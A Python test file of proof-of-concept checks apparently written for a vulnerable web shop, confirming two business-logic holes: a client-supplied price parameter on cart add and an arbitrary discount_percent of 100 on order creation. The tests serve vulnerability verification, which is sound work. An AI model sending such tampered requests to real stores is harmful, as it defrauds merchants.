"""
Business Logic PoC Tests (Vulnerabilities #19, #21)
"""
import requests


SHIPPING = {
    "name": "Test",
    "street": "Rua 1",
    "city": "Lisboa",
    "postal_code": "1000",
    "phone": "123",
}


class TestPriceManipulation:
    """#19 - Price Manipulation on POST /cart/add (custom price parameter)"""

    def test_vuln_19_price_manipulation(self, base_url, fresh_user):
        """Client sends a custom price=0.01 when adding to cart, order total reflects it."""
        h = fresh_user["header"]

        r = requests.post(f"{base_url}/cart/add", headers=h,
                          json={"wine_id": 1, "quantity": 1, "price": 0.01})
        assert r.json()["success"] is True

        r2 = requests.get(f"{base_url}/cart", headers=h)
        cart = r2.json()
        item = next(i for i in cart["items"] if i["wine_id"] == 1)
        assert item["price"] <= 0.02, \
            f"Price manipulation failed — expected ~0.01, got {item['price']}"

        r3 = requests.post(f"{base_url}/orders", headers=h,
                           json={"shipping_address": SHIPPING})
        assert r3.json()["success"] is True


class TestDiscountBypass:
    """#21 - Discount Code Bypass on POST /orders (arbitrary discount_percent)"""

    def test_vuln_21_discount_bypass(self, base_url, fresh_user):
        """Client sends discount_percent=100 to get a free order."""
        h = fresh_user["header"]

        requests.post(f"{base_url}/cart/add", headers=h,
                      json={"wine_id": 2, "quantity": 1})

        r = requests.post(f"{base_url}/orders", headers=h, json={
            "shipping_address": SHIPPING,
            "discount_code": "FREE",
            "discount_percent": 100,
        })
        data = r.json()
        assert data["success"] is True

        oid = data["order_id"]
        r2 = requests.get(f"{base_url}/orders/{oid}", headers=h)
        order = r2.json()["order"]
        assert float(order["total"]) == 0.0, \
            f"Discount bypass failed — expected total=0, got {order['total']}"
